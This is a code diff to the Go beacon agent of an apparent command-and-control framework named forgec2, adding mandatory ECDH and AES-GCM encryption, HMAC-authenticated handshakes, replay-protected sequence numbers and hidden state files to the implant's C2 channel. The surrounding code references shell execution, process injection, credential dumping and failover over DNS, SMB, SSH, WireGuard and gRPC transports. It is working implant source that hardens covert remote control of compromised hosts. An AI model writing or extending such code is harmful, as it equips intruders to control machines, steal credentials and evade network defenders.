@@ -5,9 +5,11 @@ package main
 
 import (
 	"bytes"
+	"crypto/hmac"
 	"crypto/rand"
 	"crypto/sha256"
 	"crypto/tls"
+	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
@@ -27,6 +29,7 @@ import (
 	"time"
 
 	"github.com/forgec2/forgec2/pkg/encoding"
+	"github.com/forgec2/forgec2/pkg/protocol"
 )
 
 // encodeBeacon marshals a BeaconRequest using multi-format rotation.
@@ -69,17 +72,21 @@ func init() {
 			currentEnvClass = envClass
 			currentOpsProfile = opsProfile
 			envDetected = true
-		if !opsProfile.AllowShell {
-			logDebug("[env] Shell commands disabled in this environment")
-		}
-		if !opsProfile.AllowInjection {
-			logDebug("[env] Process injection disabled in this environment")
-		}
-		if !opsProfile.AllowCredDump {
-			logDebug("[env] Credential dumping disabled in this environment")
-		}
+			if !opsProfile.AllowShell {
+				logDebug("[env] Shell commands disabled in this environment")
+			}
+			if !opsProfile.AllowInjection {
+				logDebug("[env] Process injection disabled in this environment")
+			}
+			if !opsProfile.AllowCredDump {
+				logDebug("[env] Credential dumping disabled in this environment")
+			}
 		}
 	}()
+
+	// Apply the injected runtime config block (XOR'd JSON blob) over defaults
+	// before any of the string vars are parsed below.
+	loadConfigBlob()
 
 	// Parse injected string values ( -X only supports string )
 	// Multi-C2 failover: comma-separated URLs in C2URL
@@ -116,6 +123,7 @@ func init() {
 	if BeaconTransport == "" {
 		BeaconTransport = "http"
 	}
+	beaconKey = BeaconKeyStr
 
 	// SMB pipe name: use explicit config or extract from C2URL
 	smbPipeName = SMBPipeName
@@ -202,21 +210,12 @@ func init() {
 		useCLRHosting = initCLRHosting()
 	}
 
-	// Initialize beacon payload cipher
-	if CryptoKeyStr != "" {
-		if strings.HasPrefix(CryptoKeyStr, "ecdh:") {
-			// ECDH + AES-256-GCM mode (forward-secret)
-			sess, err := newECDSession()
-			if err == nil {
-				ecdhSess = sess
-			}
-		} else {
-			// Legacy XOR stream cipher mode
-			key, err := hex.DecodeString(CryptoKeyStr)
-			if err == nil && len(key) == 32 {
-				beaconCipher = newStreamCipher(key)
-			}
-		}
+	// Initialize v2 beacon crypto: persistent identity key + ephemeral ECDH session.
+	// v2 has no legacy XOR/plaintext beacon path — encryption is mandatory.
+	loadOrCreateIdentityKey()
+	sess, err := newECDSession()
+	if err == nil {
+		ecdhSess = sess
 	}
 
 	// Expiry date check: exit if expired
@@ -367,6 +366,12 @@ func main() {
 
 	// Initial registration / first beacon
 	agentUUID = registerOrGetUUID()
+
+	// v2 protocol state: registration key derived from the compiled-in beacon
+	// key (never transmitted), persisted sequence + registered marker so a
+	// restart continues the same session timeline.
+	agentRegKey = deriveAgentRegKey(beaconKey, agentUUID)
+	loadBeaconState()
 
 	// Mark as SMB child if using SMB transport
 	if Protocol == "smb" || BeaconTransport == "smb" {
@@ -644,11 +649,60 @@ func getUUIDFilePath() string {
 	return "/var/lib/dbus/machine-id"
 }
 
+// getBeaconStateFilePath returns the persistence path for v2 protocol state
+// (frame sequence, registration marker), stored alongside the identity key.
+func getBeaconStateFilePath(name string) string {
+	return filepath.Join(filepath.Dir(getUUIDFilePath()), name)
+}
+
+// loadBeaconState restores the persisted frame sequence and registration
+// marker. The sequence must never go backwards or the server (which persists
+// last_seq) would reject our frames as replays.
+func loadBeaconState() {
+	seqMu.Lock()
+	defer seqMu.Unlock()
+	if data, err := os.ReadFile(getBeaconStateFilePath("beacon.seq")); err == nil {
+		if v, err := strconv.ParseUint(strings.TrimSpace(string(data)), 10, 64); err == nil {
+			beaconSeq = v
+		}
+	}
+	if data, err := os.ReadFile(getBeaconStateFilePath("registered")); err == nil {
+		registered = strings.TrimSpace(string(data)) == "1"
+	}
+}
+
+// persistBeaconState saves the current frame sequence and registration marker.
+func persistBeaconState() {
+	seqMu.Lock()
+	seq := beaconSeq
+	reg := registered
+	seqMu.Unlock()
+	path := getBeaconStateFilePath("beacon.seq")
+	if err := os.WriteFile(path, []byte(strconv.FormatUint(seq, 10)), 0600); err == nil && runtime.GOOS == "windows" {
+		setHidden(path)
+	}
+	if reg {
+		rp := getBeaconStateFilePath("registered")
+		if err := os.WriteFile(rp, []byte("1"), 0600); err == nil && runtime.GOOS == "windows" {
+			setHidden(rp)
+		}
+	}
+}
+
+// nextBeaconSeq allocates the next frame sequence number.
+func nextBeaconSeq() uint64 {
+	seqMu.Lock()
+	defer seqMu.Unlock()
+	beaconSeq++
+	return beaconSeq
+}
+
 func startTaskWorker() {
 	taskWorkerOnce.Do(func() {
 		go func() {
 			for task := range taskQueue {
 				result := executeTask(task)
+				ensureResultID(&result)
 				pendingMu.Lock()
 				pendingResults = append(pendingResults, result)
 				pendingMu.Unlock()
@@ -750,60 +804,20 @@ func doBeacon() {
 
 	body, _ := json.Marshal(req)
 
-	// Decide encryption mode and build payload
-	var sendBody []byte
-	var isECDH bool
-
-	if ecdhSess != nil {
-		if ecdhSess.needsHandshake() {
-			// First beacon: ECDH handshake ? send public key in top-level JSON
-			envelope := struct {
-				UUID    string `json:"uuid"`
-				ECDHPub string `json:"ecdh_pub"`
-			}{
-				UUID:    agentUUID,
-				ECDHPub: ecdhSess.publicKeyB64(),
-			}
-			envelopeJSON, _ := json.Marshal(envelope)
-			sendBody = envelopeJSON
-			isECDH = true
-		} else {
-			// Encrypt inner payload with AES-256-GCM
-			cipherB64, err := ecdhSess.encryptAESGCM(body)
-			if err != nil {
-				if Debug {
-					fmt.Printf("[!] ECDH encrypt failed: %v\n", err)
-				}
-				// Fallback to plaintext
-				sendBody = body
-			} else {
-				envelope := struct {
-					UUID      string `json:"uuid"`
-					CipherB64 string `json:"c"`
-					ECDHPub   string `json:"ecdh_pub,omitempty"`
-				}{
-					UUID:      agentUUID,
-					CipherB64: cipherB64,
-				}
-				if ecdhSess.rotationPending {
-					envelope.ECDHPub = ecdhSess.rotationPubKeyB64
-					ecdhSess.rotationPending = false
-				}
-				envelopeJSON, _ := json.Marshal(envelope)
-				sendBody = envelopeJSON
-				isECDH = true
-			}
+	// Decide frame type and build the v2 envelope. Encryption failures MUST NOT
+	// fall back to plaintext (defeats encryption / leaks beacon data); drop the
+	// beacon so the data stays queued for the next attempt.
+	sendBody, frameKind, frameSeq, ok := buildBeaconEnvelope(body)
+	if !ok {
+		if Debug {
+			fmt.Printf("[!] Beacon encryption failed, dropping beacon (no plaintext fallback)\n")
 		}
-	} else if beaconCipher != nil {
-		// Legacy XOR stream cipher: encrypt entire body
-		encrypted, err := beaconCipher.encrypt(body)
-		if err == nil {
-			sendBody = encrypted
-		} else {
-			sendBody = body
-		}
-	} else {
-		sendBody = body
+		pendingMu.Lock()
+		pendingResults = append(resultsCopy, pendingResults...)
+		pendingTaskAcks = append(acksCopy, pendingTaskAcks...)
+		pendingMu.Unlock()
+		beaconConsecutiveFailures++
+		return
 	}
 
 	// Apply traffic shape analysis and adaptation
@@ -818,7 +832,7 @@ func doBeacon() {
 	} else if Protocol == "tcp" {
 		respBody = sendTCPBeacon(sendBody)
 	} else if Protocol == "dns" {
-		respBody = sendDNSBeacon(body)
+		respBody = sendDNSBeacon(sendBody)
 		if respBody == nil {
 			dnsConsecutiveFailures++
 			if Debug {
@@ -856,6 +870,14 @@ func doBeacon() {
 		pendingResults = append(resultsCopy, pendingResults...)
 		pendingTaskAcks = append(acksCopy, pendingTaskAcks...)
 		pendingMu.Unlock()
+		// If the server rejected/never saw the frame and our persisted sequence
+		// was lost, jump the counter once per failure streak so a stale local
+		// seq can't lock us into permanent replay rejection.
+		if beaconConsecutiveFailures == 0 {
+			seqMu.Lock()
+			beaconSeq += 1000
+			seqMu.Unlock()
+		}
 		beaconConsecutiveFailures++
 		if Debug {
 			fmt.Printf("[!] Beacon returned nil, consecutive failures: %d\n", beaconConsecutiveFailures)
@@ -865,106 +887,90 @@ func doBeacon() {
 
 	beaconConsecutiveFailures = 0
 
-	// Parse response
+	// Parse response. The frame type determines the expected response shape:
+	// auth frames get a plaintext envelope, encrypted frames get {"c": ...}.
 	var resp BeaconResponse
-
-	if isECDH && ecdhSess != nil && ecdhSess.needsHandshake() {
-		// Parse handshake response ? expect ecdh_pub from server
-		var envelope struct {
-			ECDHPub   string `json:"ecdh_pub,omitempty"`
-			CipherB64 string `json:"c,omitempty"`
+	switch frameKind {
+	case agentFrameRegister, agentFrameHandshake:
+		var authResp struct {
+			Seq     uint64 `json:"seq"`
+			RegOK   bool   `json:"reg_ok"`
+			ECDHPub string `json:"ecdh_pub"`
+			Mac     string `json:"mac"`
 		}
-		if err := json.Unmarshal(respBody, &envelope); err != nil {
+		if err := json.Unmarshal(respBody, &authResp); err != nil {
 			if Debug {
-				log.Printf("[!] Failed to parse ECDH handshake response: %v", err)
+				log.Printf("[!] Failed to parse auth response: %v", err)
 			}
-			// Fallback: try parsing as full beacon response
-			if err := decodeBeacon(respBody, &resp); err != nil {
-				return
+			// Server rejected the frame (e.g. already registered): fall back to
+			// the handshake path which works for any registered agent.
+			if frameKind == agentFrameRegister {
+				seqMu.Lock()
+				registered = true
+				seqMu.Unlock()
+				persistBeaconState()
+				inFastMode.Store(true)
 			}
-		} else if envelope.ECDHPub != "" {
-			// Complete the ECDH handshake
-			if err := ecdhSess.establishFromServerKey(envelope.ECDHPub); err != nil {
-				if Debug {
-					log.Printf("[!] ECDH handshake completion failed: %v", err)
-				}
+			return
+		}
+		// Authenticate the server's public key before trusting it.
+		if !verifyResponseMAC(authResp.Seq, authResp.ECDHPub, authResp.Mac) {
+			if Debug {
+				log.Printf("[!] Auth response MAC mismatch, aborting")
 			}
-			// Re-beacon immediately with encrypted payload
+			return
+		}
+		if err := ecdhSess.establishFromServerKey(authResp.ECDHPub); err != nil {
+			if Debug {
+				log.Printf("[!] ECDH handshake completion failed: %v", err)
+			}
+			return
+		}
+		if authResp.RegOK {
+			seqMu.Lock()
+			registered = true
+			seqMu.Unlock()
+			persistBeaconState()
+		}
+		seqMu.Lock()
+		rekeyRequested = false
+		seqMu.Unlock()
+		// Re-beacon immediately with the encrypted payload.
+		inFastMode.Store(true)
+		return
+	case agentFrameEncrypted:
+		var env struct {
+			CipherB64 string `json:"c"`
+		}
+		if err := json.Unmarshal(respBody, &env); err != nil {
+			return
+		}
+		if env.CipherB64 == "" {
+			return
+		}
+		aad := []byte(agentUUID + "\x00" + strconv.FormatUint(frameSeq, 10))
+		plaintext, err := ecdhSess.decryptAESGCMWithAAD(env.CipherB64, aad)
+		if err != nil {
+			// Server restarted or rekeyed: drop the session so the next beacon
+			// performs a fresh authenticated handshake.
+			if Debug {
+				log.Printf("[!] ECDH decrypt failed: %v", err)
+			}
+			ecdhSess.invalidate()
 			inFastMode.Store(true)
 			return
-		} else if envelope.CipherB64 != "" {
-			// Session was already established (server responded with encrypted data)
-			plaintext, err := ecdhSess.decryptAESGCM(envelope.CipherB64)
-			if err != nil {
-				if Debug {
-					log.Printf("[!] ECDH decrypt failed: %v", err)
-				}
-				return
-			}
-			if err := decodeBeacon(plaintext, &resp); err != nil {
-				return
-			}
 		}
-	} else if isECDH && ecdhSess != nil {
-		// Parse encrypted response
-		var envelope struct {
-			ECDHPub   string `json:"ecdh_pub,omitempty"`
-			CipherB64 string `json:"c,omitempty"`
-		}
-		if err := json.Unmarshal(respBody, &envelope); err != nil {
+		if err := decodeBeacon(plaintext, &resp); err != nil {
 			return
 		}
-
-		// Decrypt the response with the current session key first: the server
-		// encrypts the rotation-triggering response under the OLD key. Rotating
-		// before decryption would make this response unreadable.
-		if envelope.CipherB64 != "" {
-			plaintext, err := ecdhSess.decryptAESGCM(envelope.CipherB64)
-			if err != nil {
-				if Debug {
-					log.Printf("[!] ECDH decrypt failed: %v", err)
-				}
-				return
-			}
-			if err := decodeBeacon(plaintext, &resp); err != nil {
-				return
-			}
+		if resp.Rekey {
+			seqMu.Lock()
+			rekeyRequested = true
+			seqMu.Unlock()
+			ecdhSess.invalidate()
 		}
-
-		// Session key rotation: rotate keypair and derive the new session key for
-		// the next beacon (the new agent public key is piggybacked on it).
-		if envelope.ECDHPub != "" {
-			if err := ecdhSess.rotateKeyPair(); err != nil {
-				if Debug {
-					log.Printf("[!] ECDH key pair rotation failed: %v", err)
-				}
-			} else if err := ecdhSess.establishFromServerKey(envelope.ECDHPub); err != nil {
-				if Debug {
-					log.Printf("[!] ECDH key rotation failed: %v", err)
-				}
-			}
-		}
-	} else if beaconCipher != nil {
-		var parseBody []byte
-		decrypted, err := beaconCipher.decrypt(respBody)
-		if err == nil {
-			parseBody = decrypted
-		} else {
-			parseBody = respBody
-		}
-		if err := decodeBeacon(parseBody, &resp); err != nil {
-			if Debug {
-				log.Printf("[!] Failed to parse response: %v", err)
-			}
-			return
-		}
-	} else {
-		if err := decodeBeacon(respBody, &resp); err != nil {
-			if Debug {
-				log.Printf("[!] Failed to parse response: %v", err)
-			}
-			return
-		}
+	default:
+		return
 	}
 
 	// Process SOCKS relay frames from server (before tasks, so connect arrives first)
@@ -1059,6 +1065,7 @@ func sendBeacon(body []byte) []byte {
 	}
 	return nil
 }
+
 // sendTCPBeacon implements the TCP transport using length-prefixed JSON framing.
 // C2URL should be host:port (or tcp://host:port) when Protocol=="tcp".
 func sendTCPBeacon(body []byte) []byte {
@@ -1108,33 +1115,159 @@ func sendTCPBeacon(body []byte) []byte {
 	return rbuf
 }
 
+// verifyResponseMAC checks the server's authentication response MAC:
+// HMAC(regKey, agentUUID || seq || server_pub). Guards against MITM public-key
+// substitution. A missing/invalid registration key fails closed.
+func verifyResponseMAC(seq uint64, serverPubB64, macB64 string) bool {
+	if agentRegKey == nil || macB64 == "" || serverPubB64 == "" {
+		return false
+	}
+	expected := computeFrameMAC(agentRegKey, agentUUID, strconv.FormatUint(seq, 10), serverPubB64)
+	got, err := base64.StdEncoding.DecodeString(macB64)
+	if err != nil {
+		return false
+	}
+	return hmac.Equal(expected, got)
+}
+
+// v2Envelope is the top-level transport envelope (mirrors the server's
+// beaconEnvelope field layout).
+type v2Envelope struct {
+	UUID        string `json:"uuid"`
+	Seq         uint64 `json:"seq,omitempty"`
+	Ts          int64  `json:"ts,omitempty"`
+	ECDHPub     string `json:"ecdh_pub,omitempty"`
+	CipherB64   string `json:"c,omitempty"`
+	Mac         string `json:"mac,omitempty"`
+	IdentityPub string `json:"id_pub,omitempty"`
+	RegHMAC     string `json:"reg_hmac,omitempty"`
+}
+
+// buildBeaconEnvelope wraps a plaintext beacon request in the v2 transport
+// envelope: registration (first run), authenticated handshake (session
+// missing/rekey), or AES-256-GCM ciphertext bound to (uuid, seq). Encryption
+// is mandatory — there is no plaintext or legacy XOR fallback.
+// Returns the bytes to transmit, the frame kind, the frame sequence and
+// ok=false when the payload MUST NOT be sent.
+func buildBeaconEnvelope(body []byte) (sendBody []byte, kind agentFrameKind, seq uint64, ok bool) {
+	if ecdhSess == nil || identityPriv == nil {
+		return nil, 0, 0, false
+	}
+	seq = nextBeaconSeq()
+	ts := time.Now().Unix()
+	env := v2Envelope{UUID: agentUUID, Seq: seq, Ts: ts}
+
+	seqMu.Lock()
+	reg := registered
+	rekey := rekeyRequested
+	seqMu.Unlock()
+
+	switch {
+	case !reg:
+		// One-time registration binds the identity key.
+		kind = agentFrameRegister
+		idPub := identityPubB64()
+		if idPub == "" || agentRegKey == nil {
+			return nil, 0, 0, false
+		}
+		env.ECDHPub = idPub
+		env.IdentityPub = idPub
+		env.RegHMAC = base64.StdEncoding.EncodeToString(computeRegHMAC(agentRegKey, agentUUID, idPub, ts))
+	case ecdhSess.needsHandshake() || rekey:
+		// Authenticated handshake with a fresh ephemeral key.
+		kind = agentFrameHandshake
+		env.ECDHPub = ecdhSess.publicKeyB64()
+		if agentRegKey == nil {
+			return nil, 0, 0, false
+		}
+		env.Mac = base64.StdEncoding.EncodeToString(computeFrameMAC(agentRegKey, agentUUID, env.ECDHPub, strconv.FormatInt(ts, 10)))
+	default:
+		kind = agentFrameEncrypted
+		aad := []byte(agentUUID + "\x00" + strconv.FormatUint(seq, 10))
+		cipherB64, err := ecdhSess.encryptAESGCMWithAAD(body, aad)
+		if err != nil {
+			return nil, 0, 0, false
+		}
+		env.CipherB64 = cipherB64
+	}
+
+	// Persist the sequence before sending so it can never go backwards.
+	persistBeaconState()
+
+	envelopeJSON, err := json.Marshal(env)
+	if err != nil {
+		return nil, 0, 0, false
+	}
+	return envelopeJSON, kind, seq, true
+}
+
+// ensureResultID assigns a per-result unique id when the producer did not
+// supply one (results generated outside the task worker, e.g. screenshots).
+// ids are RFC 9562 UUIDv7 so they are time-ordered and sortable while staying
+// unpredictable.
+func ensureResultID(res *TaskResult) {
+	if res.ResultID != "" {
+		return
+	}
+	res.ResultID = protocol.UUIDv7()
+}
+
 func sendTaskResult(res TaskResult) {
-	// Reuse beacon mechanism or dedicated, here we do a quick beacon with result
+	// Results keep a unique id for server-side idempotency: a result that is
+	// re-queued after a dropped frame is resent with a new envelope seq, so
+	// the server must dedupe on (task_id, rid) rather than the frame seq.
+	ensureResultID(&res)
+	// Quick results only make sense over an established session. Without one,
+	// re-queue so the next regular beacon carries the result — a registration
+	// or handshake frame cannot piggyback results.
+	seqMu.Lock()
+	ready := registered && !rekeyRequested
+	seqMu.Unlock()
+	if ecdhSess == nil || ecdhSess.needsHandshake() || !ready {
+		pendingMu.Lock()
+		pendingResults = append(pendingResults, res)
+		pendingMu.Unlock()
+		inFastMode.Store(true)
+		return
+	}
+
 	req := BeaconRequest{
-		UUID:    agentUUID,
-		Results: []TaskResult{res},
+		UUID:            agentUUID,
+		ProtocolVersion: CurrentProtocolVersion,
+		Results:         []TaskResult{res},
 	}
 	body, _ := json.Marshal(req)
+	// Encrypt with the session key so quick results never leak plaintext over
+	// any transport (including DNS). If encryption fails, re-queue the result
+	// rather than transmitting it in clear.
+	sendBody, kind, _, ok := buildBeaconEnvelope(body)
+	if !ok || kind != agentFrameEncrypted {
+		pendingMu.Lock()
+		pendingResults = append(pendingResults, res)
+		pendingMu.Unlock()
+		inFastMode.Store(true)
+		return
+	}
 	if Protocol == "tcp" {
-		sendTCPBeacon(body) // fire and forget
+		sendTCPBeacon(sendBody) // fire and forget
 	} else if Protocol == "dns" {
-		sendDNSBeacon(body) // fire and forget
+		sendDNSBeacon(sendBody) // fire and forget
 	} else if Protocol == "smb" || BeaconTransport == "smb" {
-		sendSMBBeacon(body)
+		sendSMBBeacon(sendBody)
 	} else if BeaconTransport == "wss" {
-		sendWSSBeacon(body)
+		sendWSSBeacon(sendBody)
 	} else if BeaconTransport == "ssh" || strings.HasPrefix(C2URLs[currentC2Idx], "ssh://") {
-		sendSSHBeacon(body)
+		sendSSHBeacon(sendBody)
 	} else if BeaconTransport == "mtls" || strings.HasPrefix(C2URLs[currentC2Idx], "mtls://") {
-		sendMTLSBeacon(body)
+		sendMTLSBeacon(sendBody)
 	} else if BeaconTransport == "h2c" || strings.HasPrefix(C2URLs[currentC2Idx], "h2c://") {
-		sendH2CBeacon(body)
+		sendH2CBeacon(sendBody)
 	} else if BeaconTransport == "wg" || strings.HasPrefix(C2URLs[currentC2Idx], "wg://") {
-		sendWGBeacon(body)
+		sendWGBeacon(sendBody)
 	} else if BeaconTransport == "grpc" || strings.HasPrefix(C2URLs[currentC2Idx], "grpc://") || strings.HasPrefix(C2URLs[currentC2Idx], "grpcs://") {
-		sendGRPCBeacon(body)
+		sendGRPCBeacon(sendBody)
 	} else {
-		sendBeacon(body)
+		sendBeacon(sendBody)
 	}
 }
 func executeTask(task Task) TaskResult {
@@ -1143,18 +1276,26 @@ func executeTask(task Task) TaskResult {
 		Type:   task.Type,
 	}
 
-	// Decrypt payload if task is encrypted
+	// Decrypt payload if task is encrypted. The AAD binds each field to the
+	// agent and task ID so ciphertext can't be replayed against other tasks.
 	if task.Encrypted && ecdhSess != nil {
+		aad := []byte(agentUUID + "\x00" + strconv.FormatUint(uint64(task.ID), 10))
 		if task.Command != "" {
-			dec, err := ecdhSess.decryptAESGCM(task.Command)
+			dec, err := ecdhSess.decryptAESGCMWithAAD(task.Command, aad)
 			if err == nil {
 				task.Command = string(dec)
+			} else {
+				res.Error = "task payload decryption failed"
+				return res
 			}
 		}
 		if task.Data != "" {
-			dec, err := ecdhSess.decryptAESGCM(task.Data)
+			dec, err := ecdhSess.decryptAESGCMWithAAD(task.Data, aad)
 			if err == nil {
 				task.Data = string(dec)
+			} else {
+				res.Error = "task payload decryption failed"
+				return res
 			}
 		}
 	}
